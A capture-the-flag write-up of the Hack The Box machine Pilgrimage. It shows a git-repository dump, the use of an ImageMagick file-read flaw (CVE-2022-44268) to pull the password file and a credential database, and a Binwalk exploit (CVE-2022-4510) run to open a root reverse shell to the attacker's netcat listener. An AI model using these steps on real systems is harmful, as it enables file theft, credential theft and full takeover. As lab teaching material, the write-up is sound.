---
layout: post
title: Hack The Box Walkthrough - Pilgrimage
date: 2023-09-03
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2023/09/HTB/Pilgrimage
img: 2023/09/Pilgrimage/Pilgrimage.png
---

In Pilgrimage, I had to exploit a known vulnerability in Binwalk to obtain credentials. And another known vulnerability in Binwalk to get root.

* Room: Pilgrimage
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Pilgrimage](https://app.hackthebox.com/machines/Pilgrimage)
* Author: [coopertim13](https://app.hackthebox.com/users/55851)

## Enumeration

I started the machine by running Rustscan to detect open ports.

```bash
$ rustscan -a target -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan
:
--------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.111.25:22
Open 10.129.111.25:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 14:06 EDT
NSE: Loaded 156 scripts for scanning.

....

Nmap scan report for target (10.129.111.25)
Host is up, received user-set (0.031s latency).
Scanned at 2023-09-04 14:06:26 EDT for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnPDlM1cNfnBOJE71gEOCGeNORg5gzOK/TpVSXgMLa6Ub/7KPb1hVggIf4My+cbJVk74fKabFVscFgDHtwPkohPaDU8XHdoO03vU8H04T7eqUGj/I2iqyIHXQoSC4o8Jf5ljiQi7CxWWG2t0n09CPMkwdqfEJma7BGmDtCQcmbm36QKmUv6Kho7/LgsPJGBP1kAOgUHFfYN1TEAV6TJ09OaCanDlV/fYiG+JT1BJwX5kqpnEAK012876UFfvkJeqPYXvM0+M9mB7XGzspcXX0HMbvHKXz2HXdCdGSH59Uzvjl0dM+itIDReptkGUn43QTCpf2xJlL4EeZKZCcs/gu8jkuxXpo9lFVkqgswF/zAcxfksjytMiJcILg4Ca1VVMBs66ZHi5KOz8QedYM2lcLXJGKi+7zl3i8+adGTUzYYEvMQVwjXG0mPkHHSldstWMGwjXqQsPoQTclEI7XpdlRdjS6S/WXHixTmvXGTBhNXtrETn/fBw4uhJx4dLxNSJeM=
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOaVAN4bg6zLU3rUMXOwsuYZ8yxLlkVTviJbdFijyp9fSTE6Dwm4e9pNI8MAWfPq0T0Za0pK0vX02ZjRcTgv3yg=
|   256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILGkCiJaVyn29/d2LSyMWelMlcrxKVZsCCgzm6JjcH1W
80/tcp open  http    syn-ack nginx 1.18.0
| http-git:
|   10.129.111.25:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Pilgrimage - Shrink Your Images
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:06
Completed NSE at 14:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:06
Completed NSE at 14:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:06
Completed NSE at 14:06, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds
```

There were two open ports.
* 22 (SSH)
* 80 (HTTP)

I scanned for UDP ports, but did not find any.

## Website

I opened a browser and looked at the website on port 80.

![Website](/assets/images/2023/09/Pilgrimage/Website.png "Website")

It was a website that allowed shrinking images. You could register to the site. It would give access to a dashboard that showed the images that were shrinked.

![Dashboard](/assets/images/2023/09/Pilgrimage/Dashboard.png "Dashboard")

Rustscan had detected that there was a `.git` folder. I used [git-dumper](https://github.com/arthaud/git-dumper) to extract the git repository.

```bash
$ git-dumper http://target.htb/.git/ Repo
[-] Testing http://target.htb/.git/HEAD [200]
[-] Testing http://target.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://target.htb/.gitignore [404]
[-] http://target.htb/.gitignore responded with status code 404
[-] Fetching http://target.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://target.htb/.git/description [200]
[-] Fetching http://target.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://target.htb/.git/hooks/post-commit.sample [404]
[-] http://target.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://target.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://target.htb/.git/hooks/post-receive.sample [404]
[-] http://target.htb/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://target.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://target.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://target.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://target.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://target.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://target.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://target.htb/.git/index [200]
[-] Fetching http://target.htb/.git/objects/info/packs [404]

...

[-] Fetching http://target.htb/.git/objects/cd/2774e97bfe313f2ec2b8dc8285ec90688c5adb [200]
[-] Fetching http://target.htb/.git/objects/88/16d69710c5d2ee58db84afa5691495878f4ee1 [200]
[-] Fetching http://target.htb/.git/objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548 [200]
[-] Running git checkout .


$ git log
commit e1a40beebc7035212efdcb15476f9c994e3634a7 (HEAD -> master)
Author: emily <emily@pilgrimage.htb>
Date:   Wed Jun 7 20:11:48 2023 +1000

    Pilgrimage image shrinking service initial commit.
```

There was only one commit in the repository. I started looking at the source code. All the database queries were using prepared statements. So SQL Injection was not an option.

I looked at the code that handled the files upload and shrinking of the images.

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
    $image->setLocation("/var/www/pilgrimage.htb/tmp");
    $image->setSize(100, 4000000);
    $image->setMime(array('png','jpeg'));
    $upload = $image->upload();
    if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
      $newname = uniqid();
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
      unlink($upload->getFullPath());
      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
      if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
      }
      header("Location: /?message=" . $upload_path . "&status=success");
    }
    else {
      header("Location: /?message=Image shrink failed&status=fail");
    }
  }
  else {
    header("Location: /?message=Image shrink failed&status=fail");
  }
}
```

It was using [Bulletproof](https://github.com/samayo/bulletproof) to handle the file upload. There is a [security issue](https://github.com/samayo/bulletproof/issues/90) in the GitHub repository. I tried to upload malicious files. But the code validates the mime type, and renames all uploaded files to the `.jpeg` extension. I took a note to come back to this if I didn't find anything else, but kept looking.

The application was using [ImageMagick](https://imagemagick.org/) to resize the images. The executable was part of the git repository. 

```bash
$ file extracted/Repo/magick
extracted/Repo/magick: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9fdbc145689e0fb79cb7291203431012ae8e1911, stripped

$ extracted/Repo/magick --version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

It was using a version of ImageMagick that has a [known vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2022-44268). The vulnerability allows including files in the resulting image when resizing an image. I found a [proof of concept](https://github.com/voidz0r/CVE-2022-44268) and tried it in the application.

I generated a malicious image.

```bash
 $ cargo run "/etc/passwd"
   Compiling crc32fast v1.3.2
   Compiling cfg-if v1.0.0
   Compiling adler v1.0.2
   Compiling bitflags v1.3.2
   Compiling hex v0.4.3
   Compiling miniz_oxide v0.6.2
   Compiling flate2 v1.0.25
   Compiling png v0.17.7
   Compiling cve-2022-44268 v0.1.0 (/home/ehogue/Kali/OnlineCTFs/HackTheBox/Pilgrimage/CVE-2022-44268)
    Finished dev [unoptimized + debuginfo] target(s) in 3.19s
     Running `target/debug/cve-2022-44268 /etc/passwd`
```

I sent the image to the application to be resized and downloaded it. I used `exiftool` to get the information out of the image file.

```bash
$ exiftool ~/Downloads/64f63b85e9f13.png
ExifTool Version Number         : 12.65
File Name                       : 64f63b85e9f13.png
Directory                       : /home/ehogue/Downloads
File Size                       : 1080 bytes
File Modification Date/Time     : 2023:09:04 16:18:40-04:00
File Access Date/Time           : 2023:09:04 16:19:50-04:00
File Inode Change Date/Time     : 2023:09:04 16:18:40-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 100
Image Height                    : 100
Bit Depth                       : 1
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Gamma                           : 2.2
White Point X                   : 0.3127
White Point Y                   : 0.329
Red X                           : 0.64
Red Y                           : 0.33
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.06
Palette                         : (Binary data 6 bytes, use -b option to extract)
Background Color                : 1
Modify Date                     : 2023:09:04 20:18:14
Raw Profile Type                : ..    1437.726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d.6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f.6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e.2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269.6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f...
Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
Datecreate                      : 2023-09-04T20:18:13+00:00
Datemodify                      : 2023-09-04T20:18:13+00:00
Datetimestamp                   : 2023-09-04T20:18:14+00:00
Image Size                      : 100x100
Megapixels                      : 0.010
```

The 'Raw Profile Type' field contained a long string of hexadecimal. I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')) to decode it.

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

I was able to read files from the server. The code used an SQLite database. I tried to extract that file to see if the database contained credentials.

```bash
$ cargo run "/var/db/pilgrimage"
   Compiling crc32fast v1.3.2
   Compiling adler v1.0.2
   Compiling cfg-if v1.0.0
   Compiling bitflags v1.3.2
   Compiling hex v0.4.3
   Compiling miniz_oxide v0.6.2
   Compiling flate2 v1.0.25
   Compiling png v0.17.7
   Compiling cve-2022-44268 v0.1.0 (/home/ehogue/Kali/OnlineCTFs/HackTheBox/Pilgrimage/CVE-2022-44268)
    Finished dev [unoptimized + debuginfo] target(s) in 3.26s
     Running `target/debug/cve-2022-44268 /var/db/pilgrimage`
```

I used the same technique to get the data out of the server. When I tried to open the saved file with `sqlite3`, it failed. The file was corrupted. I probably grabbed too much from the 'Raw Profile Type' field. Or I was not saving the data correctly. But before I tried to solve that issue, I tried to extract the strings out of the database file.

```bash
$ strings db.sqlite
SQLite format 3
Stableimagesimages
CREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+
indexsqlite_autoindex_images_1images
+tableusersusers
CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL))
indexsqlite_autoindex_users_1users
adminadmin
-emilyREDACTED
admin
        emily
...
```

The database contained the password for the user 'emily'. I tried to connect to SSH with those credentials.

```bash
$ ssh emily@target
emily@target's password:
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

emily@pilgrimage:~$ ls
user.txt

emily@pilgrimage:~$ cat user.txt
REDACTED
```

## Getting root

Once connected, I looked for the obvious paths to escalate privileges.

```bash
emily@pilgrimage:~$ sudo -l
[sudo] password for emily:
Sorry, user emily may not run sudo on pilgrimage.

emily@pilgrimage:~$ find / -perm /u=s 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/umount
```

I was not able to run `sudo` with the user I had. And there were no suspicious suid binaries.

I looked at the running processes on the server.

```bash
emily@pilgrimage:/var/www/pilgrimage.htb$ ps aux --forest
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           2  0.0  0.0      0     0 ?        S    05:56   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   05:56   0:00  \_ [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   05:56   0:00  \_ [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   05:56   0:00  \_ [kworker/0:0H-events_highpri]
root           8  0.0  0.0      0     0 ?        I<   05:56   0:00  \_ [mm_percpu_wq]
root           9  0.0  0.0      0     0 ?        S    05:56   0:00  \_ [rcu_tasks_rude_]

...

root           1  0.0  0.2  98268  9852 ?        Ss   05:56   0:00 /sbin/init
root         503  0.0  0.2  64800 11844 ?        Ss   05:57   0:00 /lib/systemd/systemd-journald
root         525  0.0  0.1  21848  5540 ?        Ss   05:57   0:00 /lib/systemd/systemd-udevd
systemd+     563  0.0  0.1  88436  6108 ?        Ssl  05:57   0:00 /lib/systemd/systemd-timesyncd
root         574  0.0  0.0  87060  2096 ?        S<sl 05:57   0:00 /sbin/auditd
_laurel      576  0.0  0.1   9844  5572 ?        S<   05:57   0:00  \_ /usr/local/sbin/laurel --config /etc/laurel/config.toml
root         582  0.0  0.2  47748 10300 ?        Ss   05:57   0:00 /usr/bin/VGAuthService
root         584  0.1  0.2 236744  9728 ?        Ssl  05:57   0:03 /usr/bin/vmtoolsd
root         675  0.0  0.0   6744  2800 ?        Ss   05:57   0:00 /usr/sbin/cron -f
message+     676  0.0  0.1   8260  4028 ?        Ss   05:57   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         680  0.0  0.0   6816  3032 ?        Ss   05:57   0:00 /bin/bash /usr/sbin/malwarescan.sh
root         703  0.0  0.0   2516   776 ?        S    05:57   0:00  \_ /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
root         704  0.0  0.0   6816  2364 ?        S    05:57   0:00  \_ /bin/bash /usr/sbin/malwarescan.sh
root         681  0.0  0.2 220796  8884 ?        Ssl  05:57   0:00 /usr/sbin/rsyslogd -n -iNONE
root         683  0.0  0.1  99884  7832 ?        Ssl  05:57   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         687  0.0  0.1  13852  7008 ?        Ss   05:57   0:00 /lib/systemd/systemd-logind
root         751  0.0  0.6 209752 27080 ?        Ss   05:57   0:00 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
www-data     821  0.0  0.4 210124 18736 ?        S    05:57   0:00  \_ php-fpm: pool www
www-data     822  0.0  0.4 210124 18348 ?        S    05:57   0:00  \_ php-fpm: pool www
root         768  0.0  0.0   5844  1720 tty1     Ss+  05:57   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         789  0.0  0.1  13352  7556 ?        Ss   05:57   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        1388  0.0  0.2  14712  8980 ?        Ss   06:35   0:00  \_ sshd: emily [priv]
emily       1410  0.0  0.1  14712  5904 ?        S    06:35   0:00      \_ sshd: emily@pts/0
emily       1411  0.0  0.1   8888  5572 pts/0    Ss   06:35   0:00          \_ -bash
emily       1534  0.0  0.0  10088  3684 pts/0    R+   06:40   0:00              \_ ps aux --forest
root         813  0.0  0.0  56376  1628 ?        Ss   05:57   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data     814  0.0  0.1  56944  5244 ?        S    05:57   0:00  \_ nginx: worker process
www-data     815  0.0  0.1  57296  6432 ?        S    05:57   0:00  \_ nginx: worker process
emily       1391  0.0  0.1  15148  7916 ?        Ss   06:35   0:00 /lib/systemd/systemd --user
emily       1392  0.0  0.0 101224  2548 ?        S    06:35   0:00  \_ (sd-pam)
```

There was a malware scanner watching for file modifications in '/var/www/pilgrimage.htb/shrunk/'. The scanner was a bash script, I looked at the code.

```bash
emily@pilgrimage:/tmp$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

The scanner was using `binwalk` to analyze the uploaded images. I looked at the version it used.

```bash
emily@pilgrimage:~$ /usr/local/bin/binwalk 
                                                          
Binwalk v2.3.2                                          
Craig Heffner, ReFirmLabs                                                                                            
https://github.com/ReFirmLabs/binwalk                                                                                
                                                          
Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...                                                                 
                                                          
Signature Scan Options:                                                                                              
    -B, --signature              Scan target file
...
```

And looked for [known vulnerabilities on this version](https://nvd.nist.gov/vuln/detail/CVE-2022-4510). There was one that allowed remote code execution. The malware scanner was running as root, so that looked promising. I found a [POC](https://www.exploit-db.com/exploits/51249) that used the vulnerability to spawn a reverse shell. I uploaded it to the server and gave it a try.

```bash
emily@pilgrimage:/tmp$ python3 exploit.py 64f645bca9292.png "10.10.14.68" 4444

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.

emily@pilgrimage:/tmp$ ls -ltrh
total 28K
drwx------ 3 root  root  4.0K Sep  5 05:57 systemd-private-d208b5da23a8449bab0cdf7a67b32e73-systemd-timesyncd.service-BiXT7f
drwx------ 3 root  root  4.0K Sep  5 05:57 systemd-private-d208b5da23a8449bab0cdf7a67b32e73-systemd-logind.service-6Yftrh
drwx------ 2 root  root  4.0K Sep  5 05:58 vmware-root_584-2688619665
-rwxr-xr-x 1 emily emily   51 Sep  5 06:47 pwn.sh
-rwxr-xr-x 1 emily emily 2.7K Sep  5 07:01 exploit.py
-rw-r--r-- 1 emily emily  964 Sep  5 07:02 64f645bca9292.png
-rw-r--r-- 1 emily emily 1.7K Sep  5 07:04 binwalk_exploit.png
```

I started a netcat listener on my machine and copied the generated image to the upload folder.

```bash
emily@pilgrimage:/tmp$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
```

I got a hit on my listener. I was connected as root.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.68] from (UNKNOWN) [10.129.111.112] 59448

whoami
root

cat /root/root.txt
REDACTED
```